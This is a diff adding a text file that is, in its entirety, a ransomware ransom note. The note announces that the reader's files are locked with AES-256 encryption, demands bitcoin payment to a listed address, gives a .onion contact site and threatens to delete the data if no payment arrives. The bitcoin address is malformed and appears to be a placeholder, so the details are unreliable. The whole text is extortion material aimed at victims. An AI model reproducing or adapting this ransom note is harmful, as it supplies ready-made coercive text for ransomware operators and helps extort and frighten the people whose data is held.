@@ -1,0 +1,12 @@
+##########################################
+#           YOUR FILES ARE LOCKED        #
+##########################################
+
+Your files have been encrypted using military-grade AES-256 encryption. All your data is locked.
+
+To regain access, you must follow these steps:
+1. Obtain the cryptocurrency bitcoin.
+2. Send payment to the following address: 1L6D8jR5P9qX7bV3tS2rN1mH4kG0fE9dW8cY7aB6z
+3. Contact us at this hidden service: http://a73d9e8f0a1b2c3d.onion
+
+If you do not send payment, your data will be permanently deleted.
